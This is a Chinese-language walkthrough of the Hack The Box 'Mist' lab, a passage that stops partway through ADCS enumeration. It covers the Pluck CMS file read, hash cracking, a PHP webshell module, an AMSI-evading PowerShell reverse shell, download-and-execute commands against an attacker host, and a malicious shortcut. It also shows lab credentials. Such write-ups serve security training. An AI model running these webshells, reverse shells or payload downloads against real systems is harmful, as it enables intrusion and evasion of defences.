          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/Defender-Exclusions/PetitPotam-Attack/ntlm-relay-LDAP-shell/rubeus-get-Kerberos-ticket/s4u-impersonating-Administrator/" itemprop="url" rel="index"><span itemprop="name">s4u impersonating Administrator</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/Defender-Exclusions/PetitPotam-Attack/ntlm-relay-LDAP-shell/rubeus-get-Kerberos-ticket/s4u-impersonating-Administrator/shadow-credential/" itemprop="url" rel="index"><span itemprop="name">shadow credential</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/Defender-Exclusions/PetitPotam-Attack/ntlm-relay-LDAP-shell/rubeus-get-Kerberos-ticket/s4u-impersonating-Administrator/shadow-credential/ESC13-enum-and-attack/" itemprop="url" rel="index"><span itemprop="name">ESC13 enum and attack</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/Defender-Exclusions/PetitPotam-Attack/ntlm-relay-LDAP-shell/rubeus-get-Kerberos-ticket/s4u-impersonating-Administrator/shadow-credential/ESC13-enum-and-attack/Bloodhound-Pre-Defined-Query/" itemprop="url" rel="index"><span itemprop="name">Bloodhound Pre-Defined Query</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/Defender-Exclusions/PetitPotam-Attack/ntlm-relay-LDAP-shell/rubeus-get-Kerberos-ticket/s4u-impersonating-Administrator/shadow-credential/ESC13-enum-and-attack/Bloodhound-Pre-Defined-Query/Exfil-Reg-Hives/" itemprop="url" rel="index"><span itemprop="name">Exfil Reg Hives</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>9.3k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>34 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>本文是Insane难度的HTB Mist机器的域渗透部分，其中CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice等域渗透提权细节是此box的特色，主要参考<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDI0LzEwLzI2L2h0Yi1taXN0Lmh0bWw=">0xdf’s blog Mist walkthrough<i class="fa fa-external-link-alt"></i></span>记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist.png"></li>
</ul>
<span id="more"></span>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fdluci@hacky$ nmap -p- --min-rate 10000 10.10.11.17</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 15:46 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.17</span><br><span class="line">Host is up (0.089s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.45 seconds</span><br><span class="line">fdluci@hacky$ nmap -sCV -p 80 10.10.11.17</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 15:50 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.17</span><br><span class="line">Host is up (0.086s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>m PHP/<span class="number">8.1</span>.<span class="number">1</span>)</span><br><span class="line">|_http-generator: pluck <span class="number">4.7</span>.<span class="number">18</span></span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-robots.txt: <span class="number">2</span> disallowed entries</span><br><span class="line">|_/data/ /docs/</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">52</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>m PHP/<span class="number">8.1</span>.<span class="number">1</span></span><br><span class="line">| http-title: Mist - Mist</span><br><span class="line">|_Requested resource was http://<span class="number">10.10</span>.<span class="number">11.17</span>/?file=mist</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">12.32</span> seconds</span><br></pre></td></tr></table></figure>

<h2 id="Website-TCP-80"><a href="#Website-TCP-80" class="headerlink" title="Website - TCP 80"></a>Website - TCP 80</h2><p>发现站点使用了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BsdWNrLWNtcy9wbHVjay93aWtp">Pluck CMS<i class="fa fa-external-link-alt"></i></span>4.7.18版本</p>
<h1 id="Shell-as-svc-web-on-MS01"><a href="#Shell-as-svc-web-on-MS01" class="headerlink" title="Shell as svc_web on MS01"></a>Shell as svc_web on MS01</h1><h2 id="恢复admin密码"><a href="#恢复admin密码" class="headerlink" title="恢复admin密码"></a>恢复admin密码</h2><h3 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h3><p>一些研究发现<span class="exturl" data-url="aHR0cHM6Ly9udmQubmlzdC5nb3YvdnVsbi9kZXRhaWwvQ1ZFLTIwMjQtOTQwNQ==">CVE-2024-9405<i class="fa fa-external-link-alt"></i></span>，一个在这个版本的Pluck中文件读取的漏洞。这篇来自m3n0sd0n4ld的博客文章<span class="exturl" data-url="aHR0cHM6Ly9tM24wc2QwbjRsZC5naXRodWIuaW8vcGF0b0hhY2t2ZW50dXJhcy9jdmUtMjAyNC05NDA1">Pluck CMS v.4.7.18 - Local File Inclusion unauthenticated (CVE-2024-9405)<i class="fa fa-external-link-alt"></i></span>展示了细节。&#x2F;data&#x2F;modules&#x2F;albums&#x2F;albums_getimage.php?image&#x3D;[filename]路径在返回原始文件之前不检查身份验证。在Mist发布的时候，这篇文章还不存在，尽管在Pluck GitHub上有这个issue<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BsdWNrLWNtcy9wbHVjay9pc3N1ZXMvMTIy">Inclusion of files without authentication #122<i class="fa fa-external-link-alt"></i></span>。</p>
<h3 id="目录发现-文件读取"><a href="#目录发现-文件读取" class="headerlink" title="目录发现 - 文件读取"></a>目录发现 - 文件读取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌[root☮kali]-(~/hackthebox/machine/mist)</span><br><span class="line">└&gt; curl http://10.10.11.17/data/modules/albums/albums_getimage.php\?image\=mist.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$album_name</span> = <span class="string">&#x27;Mist&#x27;</span>;</span><br><span class="line">?&gt;30<span class="comment">#                                                                                                                                                                     ┌[root☮kali]-(~/hackthebox/machine/mist)</span></span><br><span class="line">└&gt; curl http://10.10.11.17/data/modules/albums/albums_getimage.php\?image\=admin_backup.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$ww</span> = <span class="string">&#x27;c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e&#x27;</span>;</span><br><span class="line">?&gt;146</span><br></pre></td></tr></table></figure>

<p>第一个看起来像是CMS的元数据。后者看起来像一个hash。$ww是用于在PluckCMS中保存管理hash的变量。</p>
<h3 id="Crackstation"><a href="#Crackstation" class="headerlink" title="Crackstation"></a>Crackstation</h3><p><span class="exturl" data-url="aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==">CrackStation<i class="fa fa-external-link-alt"></i></span>将其识别为SHA512并立即将其破解：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lexypoo97</span><br></pre></td></tr></table></figure>

<p>然后在&#x2F;login.php使用账号密码登录</p>
<h2 id="Webshell-Pluck-Module"><a href="#Webshell-Pluck-Module" class="headerlink" title="Webshell Pluck Module"></a>Webshell Pluck Module</h2><h3 id="Create-Module"><a href="#Create-Module" class="headerlink" title="Create Module"></a>Create Module</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fdluci@hacky$ <span class="built_in">cat</span> modluci/luci.php</span><br><span class="line">&lt;?php system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>然后使用zip打包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌[root☮kali]-(~/hackthebox/machine/mist)</span><br><span class="line">└&gt; zip -r notevil.zip modluci</span><br><span class="line">  adding: modluci/ (stored 0%)</span><br><span class="line">  adding: modluci/luci.php (stored 0%)</span><br></pre></td></tr></table></figure>

<h3 id="Upload-Module"><a href="#Upload-Module" class="headerlink" title="Upload Module"></a>Upload Module</h3><p>在Pluck管理面板的”选项”下有一个”管理模块”选项：</p>
<p>点击”Install a module…”，然后选择notevil.zip</p>
<p>现在&#x2F;data&#x2F;modules目录下有notevil</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.11.17/data/modules/</span><br><span class="line"></span><br><span class="line">http://10.10.11.17/data/modules/notevil/modluci/luci.php?cmd=<span class="built_in">whoami</span></span><br><span class="line">ms01\svc_web</span><br></pre></td></tr></table></figure>

<h3 id="Bypass-AMSI"><a href="#Bypass-AMSI" class="headerlink" title="Bypass AMSI"></a>Bypass AMSI</h3><p><span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3Mvd2luMzIvYW1zaS9hbnRpbWFsd2FyZS1zY2FuLWludGVyZmFjZS1wb3J0YWw=">AMSI<i class="fa fa-external-link-alt"></i></span>是一项内置在Windows中的技术，旨在保护Windows免受恶意PowerShell（和其他攻击）的攻击。很可能是它挡住了我的PowerShell revshell。</p>
<p>幸运的是，它是基于签名的。绕过它的一个技巧（至少在撰写本文时）是从revshells.com获取PowerShell #2并更改所有变量名称。</p>
<ul>
<li>rev.ps1</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = New-Object Net.Sockets.TCPClient(<span class="string">&#x27;10.10.14.22&#x27;</span>,444);<span class="variable">$s</span> = <span class="variable">$c</span>.GetStream();[byte[]]<span class="variable">$b</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$s</span>.Read(<span class="variable">$b</span>, <span class="number">0</span>, <span class="variable">$b</span>.Length)) -ne 0)&#123;;<span class="variable">$d</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$b</span>,0, <span class="variable">$i</span>);<span class="variable">$sb</span> = (iex <span class="variable">$d</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sb2</span> = <span class="variable">$sb</span> + <span class="string">&#x27;PS &#x27;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&#x27;&gt; &#x27;</span>;<span class="variable">$ssb</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sb2</span>);<span class="variable">$s</span>.Write(<span class="variable">$ssb</span>,0,<span class="variable">$ssb</span>.Length);<span class="variable">$s</span>.Flush()&#125;;<span class="variable">$c</span>.Close()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8081</span><br><span class="line"></span><br><span class="line">POST /data/modules/notevil/modluci/luci.php HTTP/1.1</span><br><span class="line">Host: 10.10.11.17</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: PHPSESSID=oesq5ctuijids3s6qndvpimgrc</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 92</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd=powershell -c IEX(New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.22/rev.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist❯❯❯ rlwrap -cAr nc -lvnp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.11.17] 56245</span><br><span class="line"></span><br><span class="line">PS C:\xampp\htdocs\data\modules\notevil\modluci&gt; <span class="built_in">whoami</span></span><br><span class="line">ms01\svc_web</span><br></pre></td></tr></table></figure>

<h1 id="Shell-as-Brandon-Keywarp-on-MS01"><a href="#Shell-as-Brandon-Keywarp-on-MS01" class="headerlink" title="Shell as Brandon.Keywarp on MS01"></a>Shell as Brandon.Keywarp on MS01</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h3><p>该主机不是主要主机，而是运行在Mist上的虚拟机。IP地址为192.168.100.101，主机名为MS01。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\data\modules\notevil\modluci&gt; ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . :</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.100.101</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.100.100</span><br><span class="line">PS C:\&gt; hostname</span><br><span class="line">MS01</span><br></pre></td></tr></table></figure>

<p>以下目录可写</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Common Applications&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\Common Applications</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/21/2024   2:41 PM             14 luci.lnk</span><br><span class="line">-a----          5/8/2021   1:15 AM           1118 Calculator.lnk</span><br><span class="line">-a----          5/7/2021   3:14 PM           1175 Notepad.lnk</span><br><span class="line">-a----          5/7/2021   3:15 PM           1171 Wordpad.lnk</span><br></pre></td></tr></table></figure>

<h2 id="恶意链接"><a href="#恶意链接" class="headerlink" title="恶意链接"></a>恶意链接</h2><p>我将用一个恶意链接覆盖通用应用程序目录中的一个链接，看看是否有人点击它。这篇文章<span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BkYmlsYW5vc2tpL2hvdy10by10dWVzZGF5cy1zaG9ydGN1dHMtd2l0aC1wb3dlcnNoZWxsLWhvdy10by1tYWtlLWN1c3RvbWl6ZS1hbmQtcG9pbnQtdGhlbS10by1wbGFjZXMtMWVlNTI4YWYyNzYz">Windows Shortcuts With PowerShell — How To Make, Customize And Point Them To Places<i class="fa fa-external-link-alt"></i></span>讨论了如何用PowerShell制作.link文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Common Applications&gt; <span class="variable">$WScriptShell</span> = New-Object -ComObject WScript.Shell</span><br><span class="line">PS C:\Common Applications&gt; <span class="variable">$Shortcut</span> = <span class="variable">$WScriptShell</span>.CreateShortcut(<span class="string">&quot;C:\Common Applications\Notepad.lnk&quot;</span>)</span><br><span class="line">PS C:\Common Applications&gt; <span class="variable">$Shortcut</span>.TargetPath = <span class="string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span></span><br><span class="line">PS C:\Common Applications&gt; <span class="variable">$Shortcut</span>.Arguments = <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.22:888/rev.ps1&#x27;)&quot;</span></span><br><span class="line">PS C:\Common Applications&gt; <span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure>

<p>片刻后返回了一个新的shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌[root☮kali]-(~/hackthebox/machine/mist)</span><br><span class="line">└&gt; rlwrap -cAr nc -lvnp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.11.17] 56280</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">mist\brandon.keywarp</span><br></pre></td></tr></table></figure>

<h1 id="Auth-as-MS01"><a href="#Auth-as-MS01" class="headerlink" title="Auth as MS01$"></a>Auth as MS01$</h1><h2 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h2><h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>现在我有了一个域账户，我要收集侦Bloodhound的数据。获取<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9TaGFycEhvdW5kL3JlbGVhc2Vz">SharpHound最新版本<i class="fa fa-external-link-alt"></i></span>，将.exe上传到MS01，并运行它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\sharphound.exe -c All</span><br></pre></td></tr></table></figure>

<p>使用smbserver.py将20241026152607_BloodHound.zip文件拷贝到本地虚拟机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver -smb2support share . -username fd -password fd</span><br><span class="line"></span><br><span class="line">net use \\10.10.14.22\share /u:fd fd</span><br><span class="line"></span><br><span class="line">copy 20241026152607_BloodHound.zip \\10.10.14.22\share\</span><br></pre></td></tr></table></figure>

<h3 id="文件提取"><a href="#文件提取" class="headerlink" title="文件提取"></a>文件提取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fdluci@hacky$ curl -L https://ghst.ly/getbhce | BLOODHOUND_PORT=8888 docker compose -f - up</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   190  100   190    0     0   1701      0 --:--:-- --:--:-- --:--:--  1711</span><br><span class="line">100  3784  100  3784    0     0  10594      0 --:--:-- --:--:-- --:--:-- 10594</span><br><span class="line">[+] Running 3/3</span><br><span class="line"> ✔ Container mist-10101117-graph-db-1    Running                                                                                                                     0.0s</span><br><span class="line"> ✔ Container mist-10101117-app-db-1      Running                                                                                                                     0.0s</span><br><span class="line"> ✔ Container mist-10101117-bloodhound-1  Recreated                                                                                                                   0.1s</span><br><span class="line">Attaching to app-db-1, bloodhound-1, graph-db-1</span><br><span class="line">bloodhound-1  | &#123;<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2024-10-23T20:32:49.411226832Z&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Reading configuration found at /bloodhound.config.json&quot;</span>&#125;</span><br><span class="line">bloodhound-1  | &#123;<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2024-10-23T20:32:49.411647473Z&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Logging configured&quot;</span>&#125;</span><br><span class="line">bloodhound-1  | &#123;<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2024-10-23T20:32:49.446486924Z&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;No database driver has been set for migration, using: neo4j&quot;</span>&#125;</span><br><span class="line">bloodhound-1  | &#123;<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2024-10-23T20:32:49.446547825Z&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Connecting to graph using Neo4j&quot;</span>&#125;</span><br><span class="line">bloodhound-1  | &#123;<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2024-10-23T20:32:49.447226875Z&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Starting daemon Tools API&quot;</span>&#125;</span><br><span class="line">bloodhound-1  | &#123;<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2024-10-23T20:32:49.450835283Z&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;This is a new SQL database. Initializing schema...&quot;</span>&#125;</span><br><span class="line">bloodhound-1  | &#123;<span class="string">&quot;level&quot;</span>:<span class="string">&quot;info&quot;</span>,<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2024-10-23T20:32:49.450845528Z&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Creating migration schema...&quot;</span>&#125;</span><br><span class="line">b</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>打印输出管理员密码: admin&#x2F;vgeHwpCRUiLlPZ0qFnYtjMMBBubby4zs, “Administration” –&gt; “File Injest”</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在”Explore”选项卡上，搜索Brandon.Keywarp并标记为已拥有。查看”Outbound Object Control”，并注意到BloodHound-CE也显示证书：</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist1.png"></li>
</ul>
<p>看起来域用户的所有成员都可以使用Mist-DC01-CA注册一些模板。</p>
<h2 id="Recover-Brandon-Keywrap-NTLM"><a href="#Recover-Brandon-Keywrap-NTLM" class="headerlink" title="Recover Brandon.Keywrap NTLM"></a>Recover Brandon.Keywrap NTLM</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>枚举以便继续，使用Brandon.Keywrap的密码或NTLM hash会容易得多。为此，我将：</p>
<ul>
<li>使用certify.exe为用户请求证书。</li>
<li>Openssl更改生成的证书的格式</li>
<li>Rubeus.exe使用证书获取NTLM hash。</li>
</ul>
<p>从<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL1NoYXJwQ29sbGVjdGlvbi90cmVlL21hc3Rlci9OZXRGcmFtZXdvcmtfNC41X0FueQ==">SharpCollection<i class="fa fa-external-link-alt"></i></span>中获取certify.exe和Rubeus.exe，并将它们上传到Mist的C:\xampp\htdocs\files中。</p>
<h3 id="Get-Certificate"><a href="#Get-Certificate" class="headerlink" title="Get Certificate"></a>Get Certificate</h3><p>如果没有运行Bloodhound，我也可以从Certify.exe find &#x2F;enrollable中获得模板和CA信息的列表，它将列出该用户可用的各种证书模板：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\files&gt; .\Certify.exe find /enrollable</span><br><span class="line"></span><br><span class="line">[*] Listing info about the Enterprise CA <span class="string">&#x27;mist-DC01-CA&#x27;</span></span><br><span class="line"></span><br><span class="line">    Enterprise CA Name            : mist-DC01-CA</span><br><span class="line">    DNS Hostname                  : DC01.mist.htb</span><br><span class="line">    FullName                      : DC01.mist.htb\mist-DC01-CA</span><br><span class="line">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class="line">    Cert SubjectName              : CN=mist-DC01-CA, DC=mist, DC=htb</span><br><span class="line">    Cert Thumbprint               : A515DF0E980933BEC55F89DF02815E07E3A7FE5E</span><br><span class="line">    Cert Serial                   : 3BF0F0DDF3306D8E463B218B7DB190F0</span><br><span class="line">    Cert Start Date       